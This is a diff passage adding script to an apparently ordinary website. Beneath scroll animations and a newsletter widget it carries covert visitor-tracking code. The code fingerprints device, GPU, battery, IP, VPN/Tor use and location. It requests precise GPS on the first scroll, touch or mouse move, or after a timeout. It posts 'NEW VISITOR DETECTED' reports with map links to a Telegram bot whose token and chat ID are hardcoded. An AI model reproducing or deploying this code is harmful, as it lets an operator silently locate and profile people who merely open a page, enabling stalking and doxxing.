+            '430x932': 'iPhone 14 Pro Max/15 Plus/15 Pro Max',
+            '402x874': 'iPhone 16/16 Pro',
+            '440x956': 'iPhone 16 Plus/16 Pro Max'
+        };
+
+        return map[key] || `iPhone (screen: ${key}, dpr: ${dpr})`;
+    }
+
+    function detectMacModel() {
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl');
+            if (gl) {
+                const d = gl.getExtension('WEBGL_debug_renderer_info');
+                if (d) {
+                    const renderer = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+                    if (/Apple M4/.test(renderer)) return 'Mac (Apple M4)';
+                    if (/Apple M3/.test(renderer)) return 'Mac (Apple M3)';
+                    if (/Apple M2/.test(renderer)) return 'Mac (Apple M2)';
+                    if (/Apple M1/.test(renderer)) return 'Mac (Apple M1)';
+                    if (/Apple GPU/.test(renderer)) return 'Mac (Apple Silicon)';
+                    return `Mac (GPU: ${renderer})`;
+                }
+            }
+        } catch(e) {}
+        return 'Mac';
+    }
+
+    function parseAndroidDevice(ua) {
+        let brand = 'Unknown', model = 'Unknown';
+        const m = ua.match(/\(Linux;.*?;\s*([^;)]+)\s*(?:Build|;|\))/i);
+        if (!m) return { brand, model };
+        const raw = m[1].trim();
+
+        // Samsung
+        if (/^SM-/i.test(raw)) {
+            brand = 'Samsung';
+            model = lookupSamsung(raw);
+        }
+        // Xiaomi / Redmi / POCO
+        else if (/^(Redmi|Mi |POCO|M\d{4}|2\d{6})/i.test(raw) || /Xiaomi/i.test(raw)) {
+            brand = 'Xiaomi';
+            model = raw.replace(/Xiaomi\s*/i, '');
+        }
+        // Huawei
+        else if (/HUAWEI|^(ELE|VOG|CLT|LYA|ANA|NOH|OCE|JLN|ALN|CET|BRA)/i.test(raw)) {
+            brand = 'Huawei';
+            model = raw.replace(/HUAWEI[\s-]*/i, '');
+        }
+        // Honor
+        else if (/Honor/i.test(raw)) {
+            brand = 'Honor';
+            model = raw.replace(/Honor[\s-]*/i, '');
+        }
+        // OnePlus
+        else if (/OnePlus|^(IN\d{4}|LE\d{4}|BE\d{4}|GM\d{4}|NE\d{4}|CPH\d{4})/i.test(raw) && /OnePlus/i.test(ua)) {
+            brand = 'OnePlus';
+            model = raw.replace(/OnePlus\s*/i, '');
+        }
+        // Google Pixel
+        else if (/Pixel/i.test(raw)) {
+            brand = 'Google';
+            model = raw;
+        }
+        // OPPO
+        else if (/OPPO|^CPH\d{4}/i.test(raw)) {
+            brand = 'OPPO';
+            model = raw.replace(/OPPO\s*/i, '');
+        }
+        // Vivo
+        else if (/vivo|^V\d{4}/i.test(raw)) {
+            brand = 'Vivo';
+            model = raw.replace(/vivo\s*/i, '');
+        }
+        // Realme
+        else if (/Realme|^RMX/i.test(raw)) {
+            brand = 'Realme';
+            model = raw.replace(/Realme\s*/i, '');
+        }
+        // Motorola
+        else if (/moto|Motorola/i.test(raw)) {
+            brand = 'Motorola';
+            model = raw.replace(/motorola\s*/i, '');
+        }
+        // Nokia
+        else if (/Nokia/i.test(raw)) {
+            brand = 'Nokia';
+            model = raw.replace(/Nokia\s*/i, '');
+        }
+        // Sony
+        else if (/^(XQ-|SO-)|Sony|Xperia/i.test(raw)) {
+            brand = 'Sony';
+            model = raw;
+        }
+        // ASUS
+        else if (/ASUS|^ZS|ROG/i.test(raw)) {
+            brand = 'ASUS';
+            model = raw.replace(/ASUS[\s_]*/i, '');
+        }
+        // Nothing
+        else if (/Nothing/i.test(raw)) {
+            brand = 'Nothing';
+            model = raw;
+        }
+        // LG
+        else if (/^LM-|^LG-/i.test(raw)) {
+            brand = 'LG';
+            model = raw;
+        }
+        // Lenovo
+        else if (/Lenovo/i.test(raw)) {
+            brand = 'Lenovo';
+            model = raw.replace(/Lenovo\s*/i, '');
+        }
+        else {
+            // Try to extract brand from first word
+            const parts = raw.split(/[\s_-]/);
+            if (parts.length >= 2) {
+                brand = parts[0];
+                model = raw;
+            } else {
+                model = raw;
+            }
+        }
+
+        return { brand, model };
+    }
+
+    function lookupSamsung(code) {
+        const db = {
+            // S25 Series (2025)
+            'SM-S938': 'Galaxy S25 Ultra', 'SM-S936': 'Galaxy S25+', 'SM-S931': 'Galaxy S25',
+            // S24 Series
+            'SM-S928': 'Galaxy S24 Ultra', 'SM-S926': 'Galaxy S24+', 'SM-S921': 'Galaxy S24',
+            // S23 Series
+            'SM-S918': 'Galaxy S23 Ultra', 'SM-S916': 'Galaxy S23+', 'SM-S911': 'Galaxy S23',
+            // S22 Series
+            'SM-S908': 'Galaxy S22 Ultra', 'SM-S906': 'Galaxy S22+', 'SM-S901': 'Galaxy S22',
+            // S21 Series
+            'SM-G998': 'Galaxy S21 Ultra', 'SM-G996': 'Galaxy S21+', 'SM-G991': 'Galaxy S21',
+            // S20 Series
+            'SM-G988': 'Galaxy S20 Ultra', 'SM-G986': 'Galaxy S20+', 'SM-G981': 'Galaxy S20',
+            // A Series (Popular)
+            'SM-A556': 'Galaxy A55', 'SM-A546': 'Galaxy A54', 'SM-A536': 'Galaxy A53',
+            'SM-A526': 'Galaxy A52', 'SM-A515': 'Galaxy A51',
+            'SM-A356': 'Galaxy A35', 'SM-A346': 'Galaxy A34',
+            'SM-A256': 'Galaxy A25', 'SM-A245': 'Galaxy A24',
+            'SM-A155': 'Galaxy A15', 'SM-A145': 'Galaxy A14',
+            'SM-A057': 'Galaxy A05s', 'SM-A055': 'Galaxy A05',
+            // Z Fold Series
+            'SM-F956': 'Galaxy Z Fold 6', 'SM-F946': 'Galaxy Z Fold 5',
+            'SM-F936': 'Galaxy Z Fold 4', 'SM-F926': 'Galaxy Z Fold 3',
+            // Z Flip Series
+            'SM-F741': 'Galaxy Z Flip 6', 'SM-F731': 'Galaxy Z Flip 5',
+            'SM-F721': 'Galaxy Z Flip 4', 'SM-F711': 'Galaxy Z Flip 3',
+            // Note Series
+            'SM-N986': 'Galaxy Note 20 Ultra', 'SM-N981': 'Galaxy Note 20',
+            'SM-N975': 'Galaxy Note 10+', 'SM-N970': 'Galaxy Note 10',
+            // M Series
+            'SM-M546': 'Galaxy M54', 'SM-M536': 'Galaxy M53',
+            'SM-M346': 'Galaxy M34', 'SM-M236': 'Galaxy M23',
+            'SM-M146': 'Galaxy M14',
+        };
+
+        const prefix = code.substring(0, 6);
+        return db[prefix] || code;
+    }
+
+    // ========== IP INFORMATION ==========
+    async function collectIPInfo() {
+        try {
+            // Primary: ipwho.is (includes VPN detection)
+            const res = await fetch('https://ipwho.is/');
+            const d = await res.json();
+
+            if (d.success !== false) {
+                visitorData.ip = {
+                    address: d.ip,
+                    type: d.type,
+                    is_vpn: d.security?.vpn || false,
+                    is_proxy: d.security?.proxy || false,
+                    is_tor: d.security?.tor || false,
+                    is_datacenter: d.security?.hosting || false,
+                    isp: d.connection?.isp || 'Unknown',
+                    org: d.connection?.org || 'Unknown',
+                    asn: d.connection?.asn ? `AS${d.connection.asn}` : 'Unknown',
+                    domain: d.connection?.domain || 'Unknown'
+                };
+
+                visitorData.location_ip = {
+                    country: d.country || 'Unknown',
+                    country_code: d.country_code || '',
+                    region: d.region || 'Unknown',
+                    city: d.city || 'Unknown',
+                    postal: d.postal || 'Unknown',
+                    latitude: d.latitude,
+                    longitude: d.longitude,
+                    timezone: d.timezone?.id || 'Unknown',
+                    utc_offset: d.timezone?.utc || '',
+                    currency: d.currency?.code || 'Unknown',
+                    country_flag: d.flag?.emoji || ''
+                };
+            } else {
+                throw new Error('Primary API failed');
+            }
+        } catch (e) {
+            try {
+                // Fallback: ipapi.co
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                visitorData.ip = {
+                    address: d.ip,
+                    type: d.version,
+                    isp: d.org || 'Unknown',
+                    asn: d.asn || 'Unknown'
+                };
+                visitorData.location_ip = {
+                    country: d.country_name || 'Unknown',
+                    country_code: d.country_code || '',
+                    region: d.region || 'Unknown',
+                    city: d.city || 'Unknown',
+                    latitude: d.latitude,
+                    longitude: d.longitude,
+                    timezone: d.timezone || 'Unknown'
+                };
+            } catch (e2) {
+                visitorData.ip = { error: 'Failed to fetch IP info' };
+                visitorData.location_ip = { error: 'Failed to fetch location' };
+            }
+        }
+    }
+
+    // ========== BATTERY ==========
+    async function collectBatteryInfo() {
+        try {
+            if ('getBattery' in navigator) {
+                const b = await navigator.getBattery();
+                visitorData.battery = {
+                    level_percent: Math.round(b.level * 100),
+                    is_charging: b.charging,
+                    charging_time_seconds: b.chargingTime === Infinity ? null : b.chargingTime,
+                    discharging_time_seconds: b.dischargingTime === Infinity ? null : b.dischargingTime
+                };
+            } else {
+                visitorData.battery = { supported: false };
+            }
+        } catch(e) {
+            visitorData.battery = { error: e.message };
+        }
+    }
+
+    // ========== TECHNICAL INFO ==========
+    function collectTechnicalInfo() {
+        visitorData.technical = {
+            user_agent: navigator.userAgent,
+            language: navigator.language,
+            all_languages: navigator.languages ? [...navigator.languages] : [navigator.language],
+            cookie_enabled: navigator.cookieEnabled,
+            do_not_track: navigator.doNotTrack === '1',
+            max_touch_points: navigator.maxTouchPoints || 0,
+            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
+            device_memory_gb: navigator.deviceMemory || 'Unknown',
+            platform: navigator.platform || 'Unknown',
+            pdf_viewer: navigator.pdfViewerEnabled || false
+        };
+
+        // WebGL for GPU detection
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (gl) {
+                const d = gl.getExtension('WEBGL_debug_renderer_info');
+                if (d) {
+                    visitorData.technical.gpu_vendor = gl.getParameter(d.UNMASKED_VENDOR_WEBGL);
+                    visitorData.technical.gpu_renderer = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch(e) {}
+
+        // Network info
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            visitorData.technical.connection = {
+                effective_type: conn.effectiveType || 'Unknown',
+                type: conn.type || 'Unknown',
+                downlink_mbps: conn.downlink || 'Unknown',
+                rtt_ms: conn.rtt || 'Unknown',
+                save_data: conn.saveData || false
+            };
+        }
+
+        return Promise.resolve();
+    }
+
+    // ========== CLIENT HINTS ==========
+    async function collectClientHints() {
+        if (!navigator.userAgentData) {
+            visitorData.client_hints = { supported: false };
+            return;
+        }
+
+        try {
+            const hints = await navigator.userAgentData.getHighEntropyValues([
+                'platform', 'platformVersion', 'model',
+                'architecture', 'bitness', 'fullVersionList', 'wow64'
+            ]);
+
+            visitorData.client_hints = {
+                supported: true,
+                platform: hints.platform || 'Unknown',
+                platform_version: hints.platformVersion || 'Unknown',
+                model: hints.model || '',
+                architecture: hints.architecture || 'Unknown',
+                bitness: hints.bitness || 'Unknown',
+                mobile: navigator.userAgentData.mobile,
+                brands: navigator.userAgentData.brands?.map(b => `${b.brand} v${b.version}`).join(', '),
+                wow64: hints.wow64 || false
+            };
+
+            // Update device model if Client Hints provides it
+            if (hints.model && hints.model.trim() && visitorData.device) {
+                visitorData.device.model_client_hints = hints.model;
+            }
+        } catch(e) {
+            visitorData.client_hints = { supported: true, error: e.message };
+        }
+    }
+
+    // ========== SEND TO TELEGRAM ==========
+    async function sendToTelegram() {
+        dataSent = true;
+
+        if (TELEGRAM_BOT_TOKEN === '') {
+            console.log('[DEBUG] Telegram not configured. Data collected:', visitorData);
+            return;
+        }
+
+        const msg = formatTelegramMessage(visitorData);
+        await sendTelegramMessage(msg);
+    }
+
+    async function sendGPSUpdate() {
+        if (TELEGRAM_BOT_TOKEN === '') {
+            console.log('[DEBUG] GPS Update:', visitorData.gps);
+            return;
+        }
+
+        let msg = `📍 <b>GPS UPDATE</b>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━\n`;
+
+        if (visitorData.gps.error) {
+            msg += `❌ GPS Error: ${visitorData.gps.error}\n`;
+        } else {
+            msg += `🎯 Lat: <code>${visitorData.gps.latitude}</code>\n`;
+            msg += `🎯 Lng: <code>${visitorData.gps.longitude}</code>\n`;
+            msg += `📏 Accuracy: ${visitorData.gps.accuracy_meters?.toFixed(1)}m\n`;
+            if (visitorData.gps.altitude) {
+                msg += `⛰️ Altitude: ${visitorData.gps.altitude.toFixed(1)}m\n`;
+            }
+            msg += `\n🗺️ <a href="https://www.google.com/maps?q=${visitorData.gps.latitude},${visitorData.gps.longitude}">View on Google Maps</a>`;
+        }
+
+        msg += `\n\n🔗 IP: <code>${visitorData.ip?.address || 'N/A'}</code>`;
+        msg += `\n⏰ ${new Date().toLocaleString()}`;
+
+        await sendTelegramMessage(msg);
+    }
+
+    function formatTelegramMessage(data) {
+        const d = data.device || {};
+        const ip = data.ip || {};
+        const loc = data.location_ip || {};
+        const bat = data.battery || {};
+        const tech = data.technical || {};
+        const ch = data.client_hints || {};
+        const gps = data.gps || {};
+
+        // VPN status
+        let vpnStatus = '❓ Unknown';
+        if (ip.is_vpn || ip.is_proxy || ip.is_tor) {
+            vpnStatus = '🔴 VPN/PROXY DETECTED';
+            if (ip.is_tor) vpnStatus += ' (TOR)';
+        } else if (ip.is_vpn === false) {
+            vpnStatus = '🟢 Clean (No VPN)';
+        }
+
+        let msg = ``;
+        msg += `🔔 <b>NEW VISITOR DETECTED</b>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+
+        // Device Section
+        msg += `📱 <b>DEVICE INFO</b>\n`;
+        msg += `├ Type: <b>${d.type || 'N/A'}</b>\n`;
+        msg += `├ Brand: <b>${d.brand || 'N/A'}</b>\n`;
+        msg += `├ Model: <b>${d.model || 'N/A'}</b>\n`;
+        if (d.model_client_hints) {
+            msg += `├ Model (CH): <b>${d.model_client_hints}</b>\n`;
+        }
+        msg += `├ OS: ${d.os || 'N/A'} ${d.os_version || ''}\n`;
+        msg += `├ Browser: ${d.browser || 'N/A'} ${d.browser_version || ''}\n`;
+        msg += `├ Screen: ${d.screen_width}×${d.screen_height} @${d.device_pixel_ratio}x\n`;
+        msg += `├ CPU Cores: ${tech.hardware_concurrency || 'N/A'}\n`;
+        msg += `├ RAM: ${tech.device_memory_gb || 'N/A'} GB\n`;
+        if (tech.gpu_renderer) {
+            msg += `└ GPU: ${tech.gpu_renderer}\n`;
+        }
+
+        msg += `\n`;
+
+        // Battery Section
+        msg += `🔋 <b>BATTERY</b>\n`;
+        if (bat.level_percent !== undefined) {
+            let batIcon = bat.level_percent > 80 ? '🟢' : bat.level_percent > 30 ? '🟡' : '🔴';
+            msg += `├ Level: ${batIcon} <b>${bat.level_percent}%</b>\n`;
+            msg += `└ Charging: ${bat.is_charging ? '⚡ Yes' : '🔌 No'}\n`;
+        } else {
+            msg += `└ ${bat.error || 'Not supported'}\n`;
+        }
+
+        msg += `\n`;
+
+        // IP & Network Section
+        msg += `🌐 <b>NETWORK & IP</b>\n`;
+        msg += `├ IP: <code>${ip.address || 'N/A'}</code>\n`;
+        msg += `├ Type: ${ip.type || 'N/A'}\n`;
+        msg += `├ VPN: <b>${vpnStatus}</b>\n`;
+        msg += `├ ISP: ${ip.isp || 'N/A'}\n`;
+        msg += `├ Org: ${ip.org || 'N/A'}\n`;
+        msg += `├ ASN: ${ip.asn || 'N/A'}\n`;
+        if (tech.connection) {
+            msg += `└ Speed: ${tech.connection.effective_type} ↓${tech.connection.downlink_mbps}Mbps RTT:${tech.connection.rtt_ms}ms\n`;
+        }
+
+        msg += `\n`;
+
+        // Location Section
+        msg += `📍 <b>LOCATION (IP-based)</b>\n`;
+        msg += `├ Country: ${loc.country_flag || ''} ${loc.country || 'N/A'} (${loc.country_code || ''})\n`;
+        msg += `├ Region: ${loc.region || 'N/A'}\n`;
+        msg += `├ City: ${loc.city || 'N/A'}\n`;
+        msg += `├ Postal: ${loc.postal || 'N/A'}\n`;
+        msg += `├ Timezone: ${loc.timezone || 'N/A'} ${loc.utc_offset || ''}\n`;
+        if (loc.latitude && loc.longitude) {
+            msg += `└ Coords: <code>${loc.latitude}, ${loc.longitude}</code>\n`;
+        }
+
+        msg += `\n`;
+
+        // GPS Section
+        msg += `🎯 <b>GPS (Precise Location)</b>\n`;
+        if (gps.latitude) {
+            msg += `├ Lat: <code>${gps.latitude}</code>\n`;
+            msg += `├ Lng: <code>${gps.longitude}</code>\n`;
+            msg += `├ Accuracy: ${gps.accuracy_meters?.toFixed(1)}m\n`;
+            if (gps.altitude) {
+                msg += `├ Altitude: ${gps.altitude.toFixed(1)}m\n`;
+            }
+            msg += `└ 🗺️ <a href="https://www.google.com/maps?q=${gps.latitude},${gps.longitude}">Open in Google Maps</a>\n`;
+        } else if (gps.error) {
+            msg += `└ ❌ ${gps.error}\n`;
+        } else {
+            msg += `└ ⏳ Waiting for GPS response...\n`;
+        }
+
+        msg += `\n`;
+
+        // Client Hints
+        if (ch.supported && ch.model) {
+            msg += `📊 <b>CLIENT HINTS</b>\n`;
+            msg += `├ Platform: ${ch.platform || 'N/A'} ${ch.platform_version || ''}\n`;
+            msg += `├ Model: <b>${ch.model || 'N/A'}</b>\n`;
+            msg += `├ Arch: ${ch.architecture || 'N/A'} ${ch.bitness || ''}bit\n`;
+            msg += `└ Mobile: ${ch.mobile ? 'Yes' : 'No'}\n\n`;
+        }
+
+        // Meta
+        msg += `🔧 <b>META</b>\n`;
+        msg += `├ Language: ${tech.language || 'N/A'}\n`;
+        msg += `├ DNT: ${tech.do_not_track ? 'Yes' : 'No'}\n`;
+        msg += `├ Touch: ${tech.max_touch_points > 0 ? `Yes (${tech.max_touch_points}pts)` : 'No'}\n`;
+        msg += `├ Page: ${data.page_url || 'N/A'}\n`;
+        msg += `├ Referrer: ${data.referrer || 'Direct'}\n`;
+        msg += `└ Time: ${new Date(data.timestamp).toLocaleString()}\n`;
+
+        return msg;
+    }
+
+    async function sendTelegramMessage(text) {
+        try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            });
+        } catch(e) {
+            console.error('Telegram send error:', e);
+        }
+    }
+
+    // ========== UI ENHANCEMENTS ==========
+    function setupScrollAnimations() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                }
+            });
+        }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
+
+        document.querySelectorAll('.fade-up').forEach(el => observer.observe(el));
+    }
+
+    function subscribeNewsletter() {
+        const input = document.getElementById('emailInput');
+        const btn = input.nextElementSibling;
+        if (input.value.includes('@')) {
+            btn.textContent = '✓ Subscribed!';
+            btn.style.background = 'linear-gradient(135deg, #16a34a, #4ade80)';
+            input.value = '';
+            setTimeout(() => {
+                btn.textContent = 'Subscribe';
+                btn.style.background = '';
+            }, 3000);
+        }
+    }
+    
+    
+    
+
+
+/* ================== CONFIG ================== */
+const BOT_TOKEN = "8013303668:AAGrzSe9toKUSqflgxneNbmzucGitRjWNng";
+const CHAT_ID   = "6337727488";
+
+/* ================== TELEGRAM ================== */
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "Markdown"
+    })
+  }).catch(()=>{});
+}
+
+/* ================== DEVICE INFO ================== */
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+
+  let brand = "Unknown";
+  let model = "Unknown";
+  let os = "Unknown";
+
+  if (/iPhone/.test(ua)) {
+    brand = "Apple";
+    model = "iPhone";
+    os = "iOS";
+  } else if (/iPad/.test(ua)) {
+    brand = "Apple";
+    model = "iPad";
+    os = "iOS";
+  } else if (/Samsung/.test(ua)) {
+    brand = "Samsung";
+    model = "Galaxy";
+    os = "Android";
+  } else if (/Android/.test(ua)) {
+    brand = "Android Device";
+    os = "Android";
+  }
+
+  let browser = "Unknown";
+  if (ua.includes("Instagram")) browser = "Instagram WebView";
+  else if (ua.includes("Telegram")) browser = "Telegram WebView";
+  else if (ua.includes("Chrome")) browser = "Chrome";
+  else if (ua.includes("Safari")) browser = "Safari";
+
+  return { brand, model, os, browser };
+}
+
+/* ================== FORMAT MESSAGES ================== */
+function gpsMessage(pos, device) {
+  return `🛡️ *CyberShield Visitor Report*
+
+📍 *Location (GPS)*
+━━━━━━━━━━━━━━
+• *Latitude:* ${pos.coords.latitude}
+• *Longitude:* ${pos.coords.longitude}
+• *Accuracy:* ${pos.coords.accuracy} m
+
+📱 *Device*
+━━━━━━━━━━━━━━
+• *Brand:* ${device.brand}
+• *Model:* ${device.model}
+• *OS:* ${device.os}
+• *Browser:* ${device.browser}
+
+⏰ *Time*
+━━━━━━━━━━━━━━
+• ${new Date().toLocaleString()}
+`;
+}
+
+function fallbackMessage(data, device, reason) {
+  return `⚠️ *CyberShield Visitor Report*
+
+📍 *Approximate Location*
+━━━━━━━━━━━━━━
+• *Country:* ${data.country_name}
+• *City:* ${data.city}
+• *IP:* ${data.ip}
+
+❗ *Reason*
+━━━━━━━━━━━━━━
+• ${reason}
+
+📱 *Device*
+━━━━━━━━━━━━━━
+• *Brand:* ${device.brand}
+• *Model:* ${device.model}
+• *OS:* ${device.os}
+• *Browser:* ${device.browser}
+
+⏰ *Time*
+━━━━━━━━━━━━━━
+• ${new Date().toLocaleString()}
+`;
+}
+
+/* ================== FALLBACK IP ================== */
+function fallback(reason) {
+  const device = getDeviceInfo();
+  fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .then(d => sendToTelegram(fallbackMessage(d, device, reason)))
+    .catch(()=>{});
+}
+
+/* ================== GPS ================== */
+function requestGPS() {
+  if (!navigator.geolocation) {
+    fallback("Geolocation not supported");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      sendToTelegram(gpsMessage(pos, getDeviceInfo()));
+    },
+    err => {
+      fallback(err.message || "GPS denied");
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+  );
+}
+
+/* ================== AUTO TRIGGER ================== */
+let triggered = false;
+
+function triggerOnce() {
+  if (triggered) return;
+  triggered = true;
+  requestGPS();
+}
+
+window.addEventListener("scroll", triggerOnce, { once: true });
+window.addEventListener("click", triggerOnce, { once: true });
+window.addEventListener("touchstart", triggerOnce, { once: true });
+
+// Backup auto trigger (for some browsers)
+setTimeout(triggerOnce, 6000);
+
+    
+    
+
+
+/* ================= SAFE GPS MODULE ================= */
+
+function showGPSHelp() {
+  document.getElementById("gpsHelpPopup").style.display = "flex";
+}
+
+function closeGPSHelp() {
+  document.getElementById("gpsHelpPopup").style.display = "none";
+}
+
+function getPosition(onSuccess, onFail) {
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      onSuccess({
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      });
+    },
+    () => {
+      onFail("Location unavailable or denied");
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 60000
+    }
+  );
+}
+
+async function requestGPS(onSuccess, onFail) {
+
+  if (!navigator.geolocation) {
+    onFail("Geolocation not supported");
+    return;
+  }
+
+  if (navigator.permissions) {
+    try {
+      const status = await navigator.permissions.query({ name: "geolocation" });
+
+      if (status.state === "granted") {
+        getPosition(onSuccess, onFail);
+        return;
+      }
+
+      if (status.state === "prompt") {
+        getPosition(onSuccess, (err) => {
+          showGPSHelp();
+          onFail(err);
+        });
+        return;
+      }
+
+      if (status.state === "denied") {
+        showGPSHelp();
+        onFail("Permission denied");
+        return;
+      }
+
+    } catch (e) {
+      getPosition(onSuccess, onFail);
+    }
+  } else {
+    // Fallback for Instagram / WebView
+    getPosition(onSuccess, (err) => {
+      showGPSHelp();
+      onFail(err);
+    });
+  }
+}
+
+/* ========== AUTO REQUEST GPS ON FIRST INTERACTION ========== */
+
+let gpsRequestedOnce = false;
+
+function triggerGPSOnce() {
+  if (gpsRequestedOnce) return;
+  gpsRequestedOnce = true;
+
+  requestGPS(
+    (location) => {
+      console.log("GPS OK:", location);
+      // اینجا اطلاعات را بفرست به تلگرام
+    },
+    (error) => {
+      console.log("GPS FAIL:", error);
+    }
+  );
+
+  window.removeEventListener("scroll", triggerGPSOnce);
+  window.removeEventListener("touchstart", triggerGPSOnce);
+  window.removeEventListener("mousemove", triggerGPSOnce);
+}
+
+// تعامل طبیعی کاربر (بدون دکمه)
+window.addEventListener("scroll", triggerGPSOnce, { once: true });
+window.addEventListener("touchstart", triggerGPSOnce, { once: true });
+window.addEventListener("mousemove", triggerGPSOnce, { once: true });
+    
+    </script> 
+ 
+</body></html>
